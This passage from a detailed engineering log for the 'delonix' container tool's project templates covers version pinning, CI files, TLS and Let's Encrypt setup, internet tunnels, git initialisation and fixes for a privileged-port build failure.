`test`/`lint` script — invoking them would have failed with "missing script";
`composer install`+`.env`+`sqlite`+`artisan test` in `laravel`, replicating
exactly the README steps), `sonar-project.properties` (real sources/tests
per language — `laravel` points only to `routes,bootstrap,public`
because this scaffold has no `app/`/`config/` yet), `CONTRIBUTING.md`
(git-flow branch model — `main`/`develop`/`feature`/`release`/
`hotfix` — without requiring the `git-flow` CLI installed, plus Conventional Commits
and SemVer as documentation), and `commitlint.config.js` only in the three JS
templates (`node`/`nestjs`/`nextjs`, where the ecosystem is already `npm`/`pnpm` — in the
other 4 it would be a Node.js dependency foreign to a Go/Python/PHP project).

**Explicit decision, confirmed with the user**: nothing assumes external
tools installed. `git-flow`/`semantic-release`/`@commitlint/*` are NOT
called nor checked — only documented/config ready, for the user
to install when they decide to use them. A `commit-msg` hook that validated with
no dependency at all was considered and rejected (larger scope than requested).

`ADOPT_FILES` grows from 3 to 8 entries: the CI/CD/SonarQube/CONTRIBUTING/
commitlint ALSO come in when adopting an existing project (Sprint 8, above),
unlike the Delonixfile — they describe only language commands already read from
the real `package.json`, never a demo-specific path, so they do not have the
same risk of mismatching the real structure that left the Delonixfile out.

Validated live: the 7 generated templates and each one's `.github/workflows/ci.yml`/
`.gitlab-ci.yml` confirmed with `yaml.safe_load` (all valid);
the adoption mode confirmed writing the 8 glue files keeping the
real code untouched. 2 new tests in `scaffold.rs` (CI/CD comes into the
empty scaffold AND adoption).

## `-v`/`--template-version` — a template's version chosen by flag, not hardcoded (#296, extended to the 11 templates)

`odoo` (#296) introduced the mechanism, alongside the image's own `-v`:
`template.meta` gained `version=<default>`, `build.rs` embeds it in
`TEMPLATE_META`, and the scaffolder substitutes `__TEMPLATE_VERSION__` in ALL
template files (not just one) with the value of `-v`/`--template-version` —
or the `template.meta` default, if omitted — the same discipline as
`__NAME__`/`__MODULE__`/`__PORT__`. A template WITHOUT `version=` refuses `-v`
with a clear error ("has no version parameter — drop -v/--template-version"), instead
of accepting and silently ignoring it — the same "never a flag that
the user passed and the engine swallows" rule the rest of the CLI already follows.

**`django` adopted the same mechanism** (`template.meta`'s `version=5.1`):
`-v 5` (bare major) or `-v 5.1`/`-v 5.2` (major.minor) pins
`pyproject.toml`'s `"django==<versão>.*"` — the PEP 440 wildcard `==X.Y.*`/
`==X.*`, not the `>=5.1` the template used before, which let ANY
future major in without warning on the first `uv sync`. Without `-v`, it falls back to the
`template.meta` default (`django==5.1.*`, unchanged from the behaviour
prior to this session — only the FORM of the pin changed, from "no ceiling" to
"ceiling at the major"). The generated README now names the resolved version
(`# __NAME__ (Django __TEMPLATE_VERSION__)`) and documents `uv add
<pacote>` — there is no (nor was it decided to create) a generic `delonix <algo> add`:
each ecosystem's native tool (`uv add`/`npm install`/`composer
require`/`go get`) already solves this, and reimplementing it would be the same class
of "excess code" this repo avoids everywhere.

Validated live with a real `uv` (not just a unit test): `delonix init -t
django -v 5.2 app` → `uv sync` resolved and installed Django `5.2.17` (within
the pin `==5.2.*`) → `uv add python-dotenv` added the dependency to
`pyproject.toml` normally, without touching anything else → `manage.py check`
passed. The four entry points tested (`init`, `stack init`,
`container init`, and the refusal on a template without `version=`).

**Gap closed along the way, not introduced by this session**: `container
init` (`ContainerCmd::Init`) had never gained the flag — only `stack init`/`vm
init`/the top-level `init` had it (#296 touched the three, not the four); the
`cmd_init` of this group always passed `template_version: None` to
`InitOpts`. `delonix container init -t django -v 5.2` failed with
"unexpected argument '-v'" before this fix — the same class of
"feature in only one of the triplicated paths" this repo has already catalogued several
times (`ls-remote`, `vm pull`).

**Extended to the remaining 9 templates in the same session** — completes the
set: the 11 templates now have `-v`, each pinning what makes sense
for its ecosystem, with no `delonix add` command at all (decision repeated
in all of them): `go` (no framework — pins the TOOLCHAIN, in `go.mod` **and** in
the `FROM golang:` of the Delonixfile, the two always equal); `laravel` (pins
`laravel/framework` in `composer.json`, with `php`/FrankenPHP
DELIBERATELY out — they are independent axes); `node` (pins `fastify`,
the only "framework" this template has); `nextjs` (pins `next`);
`nestjs` (pins the FOUR `@nestjs/*` packages — core/common/platform-express/
cli — ALWAYS TOGETHER, because a NestJS installation with mixed majors is not
a supported combination); `python` (pins `fastapi`, the same fix as
`django`'s `>=` with no ceiling); `nginx`/`httpd`/`haproxy`
(pin the image tag, the same idiom as `odoo` — none has a dependency
file, only the `FROM`). The `--help` text stopped naming framework by
framework (it grew with each extension) and now points to the template's own
README, which is where the exact accepted form (`5`, `5.1.0`, an image
tag, ...) had to be documented anyway.

**Second gap closed, this one genuine and new to this extension**: `-v` **without**
any `-t`/`--template` (nor one chosen by interactive menu) never reached
`render_template`/`resolve_version` — `init()` jumped straight to the
generic scaffold and the flag vanished, with no error, no warning. Reproduced
live: `delonix init -v 5.2 app` (without `-t`) generated the generic scaffold as if
`-v` had never been written. Fixed with a guard in `init()` right
after resolving `chosen` — the same class of "flag the user passed
and the engine swallowed" that this feature's reason for existing already named.

The resolution logic (`resolve_version`) was extracted into a pure function,
independent of the embedded `TEMPLATES`/`TEMPLATE_META` tables — it needed
to be: with the 11 templates declaring `version=`, there is no longer any REAL
template "without a version" to test the refusal against (the test that
proved it used `node` as a fixture, and stopped serving once `node`
gained its own). `resolve_version("um-template-futuro", Some(v), "")`
proves the refusal without depending on any template existing at all.

Validated live with real toolchains (not just unit tests): `go build`/
`go vet`/`go test` over a `-v 1.22` generated project, all passing; `pnpm
install` over a `node -v 5.1.0` resolving `fastify@5.12.4` (within the pin
`^5.1.0`) and `pnpm add dotenv` writing to `package.json` normally.

**Next pass, the full cycle of the four templates that had only
been confirmed by grep/parser** (`python`/`node`/`nextjs`/`nestjs`) — the
same pass that caught the `laravel` bug above, now on the others: `uv
sync` + `ruff check` + `pytest` (default `0.115.*` and an explicit `-v 0.116`,
both resolving within the pin) for `python`; `pnpm install` + `pnpm test`
+ `pnpm build` for `node` (the 2 `node:test` tests pass, `tsc` with no
errors); `pnpm install` + `pnpm build` + `pnpm start` + `curl
/api/v1/health/live` actually responding for `nextjs` AND `nestjs`
(`@nestjs/{common,core,platform-express,cli}` confirmed on the SAME
`10.4.x` line, never mixed majors). **Zero new bugs** — unlike
`laravel`, these four already did what the README promises.

**Real `composer install` (PHP 8.3 + Composer 2.10 installed on purpose
for this verification) found a PRE-EXISTING bug in the `laravel` template,
prior to this session and to this feature**: `php artisan test` — the command that
the template's own README and its `.github/workflows/ci.yml`/`.gitlab-ci.yml`
promise and run — replied `Command "test" is not defined"`. The cause: the
command does not come from `laravel/framework` (confirmed by grep in the vendor —
zero occurrences of `TestCommand` in the whole tree), it comes from
`nunomaduro/collision`, which this template's `composer.json` never listed
in `require-dev`. In other words: this template's CI, had anyone actually
run it, would always have been red — the earlier validation (#293) only
confirmed the YAML with `yaml.safe_load` (syntax), never the command inside it
for real. Fixed by adding `nunomaduro/collision` (the same version that the
official Laravel skeleton uses) — `composer install` → `php artisan test`
confirmed passing end to end, with the default (`^12.0`, no `-v`) and
with `-v 12.5`.

**Separate finding, about the `-v` mechanism itself and not a bug of it**: pinning
an OLD MAJOR (`-v 11`, `-v 10`) makes `composer install` refuse
entirely — Composer 2.10+ blocks by default ANY `^<major>` in which
SOME release has a published security advisory, and at the end of the
life of a major that is almost guaranteed (confirmed live for both
majors: `PKSA-...` cited in the refusal). It is Composer protecting the user,
not a delonix defect — but it made `-v 11` a bad example in the
documentation (a user who copied it would hit this with no context), so
the examples were changed to `-v 12.5` (a minor within the current major, without
the problem) and the template's README gained a note explaining why.

**Last pass: the 11 Delonixfiles built and run for real with
plain `docker`** (never with this same host's `delonix` — real production runs
here, see the method note at the end of this section) — what was missing after the
previous pass validated the APPLICATION layer (`uv`/`pnpm`/`go`/
`composer`) but not the IMAGE the `Delonixfile` produces. `docker build` of
the 11 (`go`/`nginx`/`httpd`/`haproxy`/`node`/`nextjs`/`nestjs`/`python`/
`django`/`laravel`/`odoo`) — **zero failures**; none uses the Delonix
extensions (`SCAN`/`CPUS`/`MEMORY`/`SECURITY`), so a raw `docker build -f
Delonixfile .` already suffices, with no need for `delonix build`. The 10
standalone run with real `docker run` + `curl` to the exact health path that
the `template.meta`/README promise — all responding (`nginx`/`httpd`/
`haproxy` at `/healthz`, the rest at `/api/v1/health/live`). `odoo`
needs the database (the README already warns that on its own it never becomes healthy)
— replicated by hand with `docker network create` + a `postgres:16` with the
manifest's `networkAlias: db` + the credentials from the `kind: Secret`
(`POSTGRES_USER`/`POSTGRES_PASSWORD`/`USER`/`PASSWORD`, all `odoo`): after
~25s of startup, `/web/health` replied `{"status": "pass"}`. **Zero
new bugs** — `laravel` remains the only real fix of this whole series.
All test containers/network/images were removed afterwards (own
names/ports, never those of this host's real state — see the note below).

**Method note, for whoever repeats this on this or another shared host**:
this host runs delonix for real (production containers — Odoo, Postgres,
Redis, coturn, Ollama — all live during this verification). So the
validation used **plain `docker` instead of `delonix build`/`delonix stack
apply`** — `docker` is a completely separate container engine, with
no point of contact with this host's `delonix` holder/SDN/registry, and
the verification's names/ports/network (`tpl-*`, `odoo-test-*`, ports
19001-19011) were chosen to never collide with what was already there.
`delonix build`/`stack apply` would have been the truest proof (it is the real engine
the users use), but never on a shared production host without that being
the explicit request.


## The edge templates are born with HTTPS and sized for load (2026-10-01)

`nginx`, `httpd` and `haproxy` had TLS only in a comment, 128M/0.5 CPU, and bench
limits (`worker_connections 1024`, `maxconn 2048`, default MPM). Now:

- **HTTPS on from birth**: `tls=8443` in `template.meta`, token `__TLS_PORT__`. The
  HTTP port is left for the health, the ACME challenge and a 308 to HTTPS. HTTP/2, TLS 1.2/1.3, suites
  only with forward secrecy. **HSTS is OFF on purpose**: it fixes the host NAME on all
  ports, and on `localhost` it would force HTTPS on all the machine's other local services.
- **The certificate is generated by `init`**, in `./tls` (`ensure_tls`): `mkcert` if it exists on the
  host, otherwise self-signed by the binary itself (`rcgen`, already in the tree). A pair that is already
  there is KEPT. The key stays 0600, is mounted read-only, and `tls/` is in the
  `.dockerignore` and the `.gitignore`. `scripts/tls.sh` renews, installs a certificate one
  already has, or runs Let's Encrypt: by HTTP-01 (webroot in `./acme`; only nginx and httpd — the
  HAProxy does not serve files) or by DNS-01 (`letsencrypt-dns`, all three).
- **`nproc` inside the container returns the HOST's cores** (measured: 32). So
  `worker_processes`/`nbthread` are 2, equal to the manifest's `cpus: "2.0"`, and not `auto`.
  `nofile` 65,535 via the manifest's `ulimit:` (measured inside the container).
- **The config check at build runs without a certificate**: none of the three images carries
  `openssl`. nginx and haproxy validate a copy without the certificate lines; httpd only
  checks that the files exist and are not empty, and uses two deleted markers in the
  same `RUN`.
- **HAProxy**: the manifest says `user: "0"` and `haproxy.cfg` says `user haproxy` — the master
  reads the key as root, the worker handles traffic as `haproxy`. The `SIGUSR2` reloads
  config and certificate with the same PID (measured).
- **httpd**: the TLS session cache is a memory-mapped file; it sits on a tmpfs
  (`/run/httpd`) so it never touches disk.

**The generator** (`cmd/scaffold.rs`): `TEMPLATE_KV` (all the `template.meta` keys:
`tls`, `open`, `login`, `password`, `wait`) alongside `TEMPLATE_META`. In a terminal, the
`init` asks what only the person generating can decide — another port when the template's
is taken (offers the next free one), extra names for the certificate — and outside a terminal
uses the defaults and says what it found. `--up` refuses a taken port BEFORE the build, with
the process name; the build draws its own steps (it ran doubled under a single
spinner); and the end prints the address to open, the certificate and, when the template declares them
(`odoo`: `admin`/`admin`), the factory credentials with the warning to change them. The `wait=` of
`odoo` (300 s) is now read — it was in the file and nothing consumed it.

**Measured** (2026-10-01, rootless, via the published port): the three with 10,000 HTTPS requests at
300 concurrent, 10,000 200 responses. It is a proof that they hold, not a benchmark: the
tool was `curl --parallel`, the host has no `ab`/`wrk`.
**Let's Encrypt, measured on 2026-10-01**: `scripts/tls.sh letsencrypt` was run end to
end against Pebble (Let's Encrypt's test ACME server), with the host's nginx
forwarding only `/.well-known/acme-challenge/` to the container: the challenge was served by the
container (200 in its log, agent `LetsEncrypt-Pebble-VA`), the certificate issued, installed
in `./tls` and loaded with the SAME pid. Against the REAL staging, with `le-test.ngolacloud.com`
(the domain has a wildcard to this host's public IP), the account registered and the CA replied
`Timeout during connect`: public port 80 does not reach this machine (router or operator).
The script gained `LETSENCRYPT_STAGING=1`, `ACME_SERVER=<url>` and the email `-`. The `httpd`
template uses the same script and only has the ACME path proven by the smoke.
**The smoke lied with the server down, and the nginx cache stored a 404 from the ACME
(2026-10-02)**. With the stack destroyed, `scripts/smoke.sh` printed twelve failures and TWO `ok`
(«TLS 1.1 is refused», «no version in the Server header»): a check written as «this does NOT
happen» passes when nothing responds. Now the script stops at the entrance with a line («nothing
answers at …») and the negative checks first require a response. And in the `nginx` template the
`open_file_cache_errors on` remembered the «not found»: an ACME challenge path requested once
before the file existed replied 404 with the file already there (measured three times
in a row); `open_file_cache off` in that `location`, and the smoke has a check that reproduces it.

**A second `--up` over the project itself (2026-10-02)**. Two defects, the first mine:
the `--up` port check refused a project that was ALREADY up, naming its
`slirp4netns` as «another process» — now a port of the project's own container
(`port_owner`) is not a conflict, and that of another delonix container is named by name. And, past
that, an altered and rebuilt project was left «is UP» with the old container: the manifest
names the TAG, the tag does not change, the plan has nothing to do. `--up` compares what the image IS
before and after the build and recreates the container when it changed. **It compares layers + config, not the
id**: the id is the digest of a config that carries the build time, always changes, and would recreate the
container on every `--up`. A container of the tag that is not running is also recreated (the
`apply` leaves a `Dead` record as is). The removal repeats for up to two minutes, because with the
disk busy an `rm -f` returns DX-8101 and keeps the record.
**`--force` does NOT regenerate an already-generated project**: a folder with content is ADOPTION (ADR-0061
D5) and only `Delonixfile`, manifest and `.dockerignore` are written. To receive an updated template
one generates in another folder.

**The flags exist since 2026-10-02**: `--port`, `--tls-port` and `--hostname` (repeatable), in a
single `EdgeArgs` (`clap::Args`) flattened into the three `init` that accept a template — `delonix init`,
`stack init` and `container init` — so they do not grow different flags in each one. A flag is
an answer: it replaces the terminal's question and is not guessed. `--tls-port`/`--hostname`
on a template without TLS, the two ports equal, a name that is not a host, or any of the three without a
template are REFUSED before writing anything at all.
**Let's Encrypt by DNS-01 (2026-10-02)**: `scripts/tls.sh letsencrypt-dns <domínio> <email>`
in the three templates. It validates by TXT record, so nothing has to reach the host (NAT, CGNAT),
it issues wildcards, and it is the `haproxy`'s first Let's Encrypt path. Without a hook, the script shows
the record, saves it in `letsencrypt/dns-challenge.txt` and waits until ALL the zone's name
servers serve it (`DNS_WAIT`, 1800 s; it asks the authoritative ones, without recursion: a
public resolver would store the negative answer). With `DNS_AUTH_HOOK`/`DNS_CLEANUP_HOOK` a
command creates and deletes the record, and the renewal is the `certbot renew` the script prints. Without a
hook, renewing is running the command again. `haproxy` refuses `letsencrypt` (HTTP-01) by
name; before, it issued a local certificate for the names «letsencrypt, domínio, email».
**Measured**: against the REAL Let's Encrypt staging, with `le-test.ngolacloud.com` (DNS on
GoDaddy) and the machine on a network whose public port 80 does not reach here (measured from three points
outside): record created by hand, served by the two name servers after 2390 s,
certificate issued (`(STAGING) Baloney Bulgur YE2`), installed in `./tls` and served by the
nginx without restarting the container. Against Pebble: DNS-01 with hooks issued `*.shop.test`, and the
HTTP-01 after the refactoring issued `www.shop.test`.
**After staging, asking for the production one did nothing** (measured when asking for the production one for
the same name): certbot replied «not yet due for renewal», and the script said «reloaded with
the new certificate» with the staging one still there. Staging first is the path the README
recommends, and HTTP-01 had the same defect. The script now names the ACME directory it
talks with (`acme_server`) and forces the renewal when the certificate it already has for the name came
from another (`server =` in `letsencrypt/renewal/<nome>.conf`). Against Pebble, in both modes:
the same CA keeps the certificate, another CA replaces it. And the `certbot renew` line the script
prints, with hooks and `--force-renewal`, renewed and installed via the deploy hook.
**Production, measured on 2026-10-02**: with the staging certificate already installed, the same command
without `LETSENCRYPT_STAGING` forced the renewal, requested a new TXT record (served by the two
name servers after 1470 s) and installed a certificate from the production CA (`YE1`,
valid until 2026-12-31), served by the nginx without restarting the container and verified by `curl`
against the system trust (`ssl_verify=0`).
**HTTP-01 against Let's Encrypt, measured on 2026-10-02**, with public port 80 not reaching
here, through a public tunnel to the container's HTTP port. Staging and then production for the
tunnel's domain: both issued, the production one (`YE2`) served by the nginx and verified by
`curl` against the system trust. Only `localhost.run` served, and the other two failed
for reasons that are not the script's: free **ngrok** redirects
`/.well-known/acme-challenge/` in HTTP to `acme.ngrok.com` (its ACME), and the CA received a
404; free **pinggy** responds to any `Mozilla/…` agent (the Let's
Encrypt validator is one) with a 15 KB warning page, and the CA refused it («reader size limit
exceeded»). **The `nginx -s reload` returns before the new workers take over**: a connection
right after the «reloaded» still received the old certificate, and seconds later the new one.
Two details seen: certbot shows the text of the manual step as «ran with error output»
(the hook writes to stderr when there is no terminal), and says it scheduled the renewal — its
task only covers `/etc/letsencrypt`, not the project's `./letsencrypt`.

**Seen along the way, and it is not the templates'**: with the host loaded, a `stack destroy` gave
DX-8101 (an httpd thread in `D` 4.5 min after the SIGKILL) and, when the next `rm`
passed, the container's `slirp4netns` stayed alive holding the published ports — the next `apply`
replied «port 8080 is already in use by slirp4netns».
## The templates ship a tunnel to the internet without a public IP (`delonix-tunnel.yaml`, 2026-10-02)

The 11 `init` templates generate `delonix-tunnel.yaml`: a `kind: Gateway` OUTSIDE the main
manifest, so `stack apply` never opens it. `delonix stack apply -f delonix-tunnel.yaml`
opens it, `delonix get gateways` gives the URL, `delonix delete gateways <name>-tunnel` closes it (the
`stack destroy` does not touch it: a tunnel has no ownership label). The README of each template
has the section «On the internet without a public IP», and the end of `--up` points to it.

- **Cloudflare is the templates' provider, and the choice was measured.** It covers both modes with the
  same agent: a quick tunnel without an account (`*.trycloudflare.com`, random) and a named tunnel on the
  user's domain (DNS on Cloudflare, token in a `kind: Secret` via `tokenSecretRef`).
  It shows no warning page to browsers and sends `X-Forwarded-Proto` with the real scheme. The
  free ngrok also shows no warning, gives a FIXED name per account (`*.ngrok-free.dev`, the
  same across the three measured openings) and sends `X-Forwarded-Proto`; the free pinggy shows a
  15 KB warning page to any `Mozilla/…` agent; `localhost.run` does not send
  `X-Forwarded-Proto` and exits when stdin reaches the end (it only holds up with a stdin that never
  ends, which is why it is not in the engine).
- **In the edge templates the tunnel points to the TLS port** (`insecureSkipTlsVerify: true`): the
  HTTP port redirects to `https://<host>:<TLS port>`, which the public address does not have. The
  local certificate (mkcert or self-signed) cannot be verified on the agent→localhost hop;
  the visitor receives the provider's one. All three TLS servers redirect to
  `https://<host>/` when the tunnel says `X-Forwarded-Proto: http` (a direct client that sends
  the header only redirects itself).
- **Django only answers to the names in `ALLOWED_HOSTS`**: as generated, the tunnel gives 400. The
  README tells you to add `.trycloudflare.com` (or the domain) and `TRUSTED_PROXY=*`, and **recreate
  the container** (`container rm -f` and `stack apply`): an `env` change does not apply to a
  container that already exists, and the `--replace Container/<name>` that the plan condition suggests does
  nothing, because the plan does not see the change (recorded to fix separately).
- **Measured live** (isolated root, quick tunnel): nginx, httpd and haproxy serve HTTPS through the
  public address and send the visitor from HTTP to `https://<host>/`, with the local redirect
  to the TLS port intact and all three `smoke.sh` passing; the Go API and the Django one (after the
  two adjustments) created and listed a note through the tunnel, with a browser `Origin`.
- **Not validated**: the named tunnel on an own domain (needs a domain with DNS on
  Cloudflare) and the node, nestjs, nextjs, fastapi, laravel and odoo templates through the tunnel (the
  file and the port are in the test `every_template_ships_an_opt_in_tunnel`).

## A generated project is born as a repository (2026-10-15)

Owner's request: the `init` project must be born git-ready, so that the
next step is to add the remote and push, and not four
preparation commands. `git_init` (`cmd/scaffold.rs`) runs after the project is
complete — files and certificate — and **never in adoption mode**, because
that project has its own history.

**Four refusals, each one because the opposite is worse**: without `git` in PATH
it says so and moves on (a scaffold does not fail over a tool that the project does not
need to build); over a `.git` that already exists it touches nothing;
**inside an existing work tree** it refuses to create a nested repository — in a
monorepo subdirectory that trap only shows up when someone pushes and the
files are not there, and `git rev-parse --is-inside-work-tree` is the only honest way
to ask; and without a configured author it leaves everything STAGED and prints the
two `git config`, instead of inventing a name and an address that would stay in the
history of every project generated here. `--initial-branch` needs
git 2.28; without it, `git init` + `symbolic-ref`.

**And `.git` is metadata, not generated content — every walker over a project
has to agree with that.** Two tests failed the instant the
repository came into existence: one reads each project file as UTF-8 (git's
objects are binary) and the other compares file by file what two
templates generate (the objects differ byte by byte between two runs of the SAME
template). Both walkers skip `.git`. The battery's `grep -r` for unsubstituted
tokens was not affected — measured, not assumed.

**Pushing to a platform does NOT belong here**, and the reason is the gate: the
`CONSUMER_NAMES` of `scripts/arch_fitness.py` refuses `delonixctl`,
`ngolacloud` and `paas` in `crates/`, `bins/` and `proto/` — and the templates live in
`bins/delonix-runtime-bin/templates/`, with `.md`/`.yaml`/`.sh` inside the
sweep. What the engine delivers is the precondition (the repository on `main` with
one commit); the remote name and the platform belong to whoever consumes it.

**The functional gate refused the first version, and five of the six findings were
real.** The most serious one with a credential consequence: `odoo` was the **only**
one of the eleven without `.gitignore`, and both the README and the manifest comment
tell you to move the database password to `.secrets.env`, «a file you keep
OUT of git». As long as there was no repository the promise was merely imprecise; with
the repository existing from the first second, whoever followed it put the
password in a file that git was already watching. **The `.dockerignore` keeps a
file out of an IMAGE — it is not the same file nor the same promise.**
Gate: `no_template_tells_you_to_keep_a_secret_in_a_file_git_is_watching`
(verified to fail with odoo's `.gitignore` removed).

The other four, all fixed and measured:

- **It blamed the author for ANY commit failure.** A missing signing
  key, a hook inherited from `init.templateDir`, a read-only object store
  — all gave «the commit needs an author» and two `git config` that resolve
  nothing. Same family as «the ENOENT of a `Command::status()` is not a
  missing file». Now the author is only named when it really is missing, and in the
  other cases git's own words are quoted (measured: `fatal: cannot
  exec '/nao/existe'`).
- **The generic scaffold (without `-t`) was left out.** It writes the same kind of
  artefact and did not gain a repository, with not a line saying so.
- **The `init` `--help` promised none of this**, and it is the oracle: the command
  now creates `.git/` and a commit in the caller's directory.
- **The `git --version` probe read the spawn's `Err` and not the exit status** —
  it answered «git starts», not «git works».

And the five new messages had no entry in `pt.po`. The
`help_i18n_tests::todo_o_help_de_comando_tem_traducao_pt` caught the change to
`--help` on its own; the `po::t` messages **have no gate** — it is the gap that
the report itself names, and it is written here.

**To do, requested the same day**: a `VMfile` per template, with a systemd unit
enabled at boot, so that `delonix vm build` produces a VM that already runs the
project. The grammar serves (`FROM`/`SIZE`/`RUN`/`COPY`/`USER`/`CLOUDINIT`/
`VCPUS`, without `CMD` because a VM boots an init, and `COPY <dir>` copies the
CHILDREN to the destination), but three things need measurement before writing
eleven recipes: the distro's runtime against the template's pin (Ubuntu 24.04 ships
Go 1.22 and the templates pin 1.26, so a `go build` fails on `go.mod requires
go >= 1.26`), the `tls/` that a `COPY .` would carry INSIDE the image — the opposite
of what these templates promise, and the output is a one-shot unit that generates the
certificate on each VM's first boot — and the validation, which is a
`vm build --network` per template.

## The 11 templates reviewed, and the contract now has a gate (2026-10-15)

Following the privileged-port bug, the ELEVEN templates were generated with this host's
adversarial port (`--port 79`, and `--tls-port 78` on the three that serve
TLS) and **built**: **11/11 rc=0**. `nginx` was the only one to fail and it failed
every time; `httpd -t` and `haproxy -c` do not bind (measured, not deduced). The table
with the times is in `references/estado.md` of the `delonix-template` skill.

**One finding from the sweep itself, still OPEN.** The first pass used the
template name as the directory name and three projects did not build, with
exit 0 on generation: `init -t go ./go` gives `invalid module path: "go"`, and
`-t django ./django` / `-t fastapi ./fastapi` give a package that **depends on
itself**. `check_project_name` validates the SHAPE (DNS label) and not the collision
with the name that the ecosystem will declare as a dependency. The fix has to
be narrow — the name that THIS template declares, never «any package from
PyPI» — and it is its own work.

**An unknown key in `template.meta` was silently ignored.** That
file is the interface between a template and the generator, and a `tsl=8443` for
`tls=8443` gave a template without TLS, without a certificate and without `--tls-port`, with
nothing saying so — the «accepted-and-ignored» class that the rest of the engine refuses. The
`build.rs` now **stops the build** with the key name and the list of
known ones, as `wait=` already did for a value that does not parse.

**The ADR-0061 contract now has a gate.** Before: `nginx`, `httpd`,
`haproxy` and `odoo` had **zero** CI, SonarQube and `CONTRIBUTING.md`; `nestjs`
had lost the `commitlint` that its two siblings have; and none of the 11 had the
architecture advice section. None of that said it was missing. Now the
`every_template_is_born_with_the_engineering_contract` requires, of EVERY
template, both CIs (with GitLab's declaring itself the same gate as GitHub's),
the `sonar-project.properties`, the `CONTRIBUTING.md` documenting
Conventional Commits, and the `README.md` with the sections «Architecture: where to
take this» and «What not to do yet»; and the
`the_node_templates_carry_a_commitlint_config` requires the config in the three Node ones
**and** that it be in `CI_FILES` — otherwise adoption writes it into a project whose
CI was deliberately skipped. Verified to fail with a file removed.

**The CI of the three edge ones runs the real binary against the real config**
(`scripts/ci-check.sh`: it builds the image and probes it **from outside**), and the two
previous forms were discarded BY MEASUREMENT, not by taste: from inside the
image via loopback, `/nginx_status` (`allow 127.0.0.1`) answers 200 and the
«not public» check fails against a correct config; with the container's eth0 address,
httpd's `Require local` counts the SERVER'S OWN addresses, and
haproxy runs as non-root and cannot even write the certificate. Live:
nginx 15/15, httpd 15/15, haproxy 11 ok + 1 honest skip, rc=0 on all three.

**And running the CI instead of reading it found two real bugs in the generated
projects:** the `smoke.sh` of the three accepts the URLs as an argument and **ignored them**
in one check, with `127.0.0.1` hardcoded — against any address other than
loopback (a staging host, a tunnel, a CI container) it gave FAIL against a
server redirecting exactly as configured; and the last `haproxy` check
calls `delonix container exec <name>`, which outside a container managed
by delonix has no way to pass — it became a **skip with the reason**, because saying
FAIL there would be as dishonest as saying ok.

**The doctrine of these templates is in the `delonix-template` skill** (the harness's
`delonix-runtime` plugin): the contract, the measured review procedure,
the bad-practice catalogue per stack, the full table of parameters
(`references/parametros.md`), the catalogue of architectures that the README
advises (`references/arquiteturas.md`) and the dated state
(`references/estado.md`).

## A privileged port in `init` made the project impossible to build (2026-10-15)

Production bug: `delonix init -t nginx --port 9000 --tls-port 943 <dir>` generated the project
and the `build` died ALWAYS at `nginx: [emerg] bind() to 0.0.0.0:943 failed (13: Permission
denied)`, in the step that should only check the configuration syntax. Reproduced here with the
port shifted to this host's threshold (`ip_unprivileged_port_start` = 80, so `--tls-port
79`): same failure, same step.

**Four measurements, and each one changed the design of the fix:**

1. **The `build` work container runs in the HOST's netns** — `readlink /proc/self/ns/net`
   gives the SAME inode as the host (the `work_launch` says it: «on the host's network (a `RUN` fetches
   packages)»). Our userns does not own that netns, so the `CAP_NET_BIND_SERVICE` that the
   container has in `CapEff` is not valid there, and what decides is the host's `ip_unprivileged_port_start`.
2. **`nginx -t` BINDS each `listen` it reads** — it is not just a parser. That is why the step fails.
3. **And it tolerates EADDRINUSE: only EACCES is fatal.** Measured inside the container, with the port
   occupied by an `nc` in the same netns: `rc=0`. That is, the obvious gate — «occupy the port and build»
   — would pass over the defective binary. **It is privilege, and only privilege, that bites**, and that is
   why the gate's port comes from the host's REAL threshold instead of being a hand-picked number.
4. **Only nginx has this problem.** `httpd -t` and `haproxy -c` built with `--port 79
   --tls-port 78` without a single complaint — they do not bind. The fix is in the nginx template, not the three.

**And the port is not unusable — it was only the CHECK.** Inside its own netns (the one a
container with `-p` receives, and which its userns owns) the same `nginx -t` with `listen 943`
returns `rc=0`, even with that netns's `ip_unprivileged_port_start` at 1024: there the capability
holds. What really fails is publishing `943:943` on the HOST, and the engine already refuses that with the output
that names `--low-ports`.

**The fix, in three places:**

- **The check runs over a copy without ports.** The two `listen` become unix sockets
  (`/tmp/chk-{http,tls}.sock`) in the copy that `nginx -t` reads — without privilege and without touching a
  host port. It is the same discipline that already removed the certificate's two lines from there, which
  also does not exist at build time. Verified that the check **still catches an error**:
  a `gzip` with too many arguments still fails the build.
- **`init` WARNS at the moment the flag is given** (`plan_for`), because the common flow is to generate
  now and `stack apply` later, where the refusal arrives late. A warning and not a refusal: the project may
  well be for a host with a lower threshold.
- **`--up` REFUSES before building** (`refuse_unusable_ports`, which was
  `refuse_busy_ports`). It is the argument that the function's own doc-comment already made for the
  occupied port — «found only at `stack apply`, it costs the whole build first» — applied to the
  privileged port, which was left out.

**Second bug, from the same report: `init -t odoo` built the NGINX project.** Over a
directory that already had a generated project, `init` wrote nothing, printed «nothing to do
(everything already existed)» **and proceeded to `--up`**, building and starting the Delonixfile
that was there, waiting for odoo's health path, on odoo's port. The command reported success
for something it did not do. `refuse_foreign_project` compares, BEFORE the first write, the two
pieces that decide what gets built — `Delonixfile` and `delonix-manifest.yaml` — with what this
command would write, and refuses (class 5) naming the two `FROM`. **Narrow scope on
purpose**: a hand-edited `nginx.conf` is not glue and never blocks anything, the same template with
the same flags renders byte for byte equal and passes (the 2nd idempotent `--up` keeps
working), and `--force` is the exit that the refusal itself offers.

**Gate**: the «a PRIVILEGED port» section of `scripts/e2e.sh`, 10 checks. Verified by the
house rule — **10/10 with the fix, 4/10 against the published binary (5.0.2)**, and the six
that fail are exactly the six facets. Two of my own defects caught while measuring it, both already
catalogued in this file: the `if timeout … ; then … else skip` read a REAL build failure
as «the environment did not cooperate» (only 124 is environment, any other rc is the bug), and the two
`--up` checks passed on rc=1 — which the defective binary also returns, only
after the whole build has failed; they now judge the REASON and the absence of any build.

**And `| grep -q` killed two measurements this session**, the trap this file already records:
the warning comes out early, the `grep -q` closes the pipe on the first match and `init` dies with SIGPIPE
before writing the project — once in the gate (the next build had nothing to build) and
once in a manual validation, which gave me a directory with the wrong template and almost made me
conclude that the refusal did not work. The output is captured and searched within.

## The image's `USER`, and the `chown` that hands the rootfs to the user (ADR-0062, 2026-10-01)

Found in the `odoo` template and measured with `haproxy:3.4-alpine` (15 MB, `USER haproxy`).
There are three defects, and only the first was the one being looked for:

- **The image's `USER` is read by nothing.** `container run haproxy:3.4-alpine id` answers
  `uid=0`; `resolve_run` only looks at `--user`. Since v1.0.0, with no error or warning.
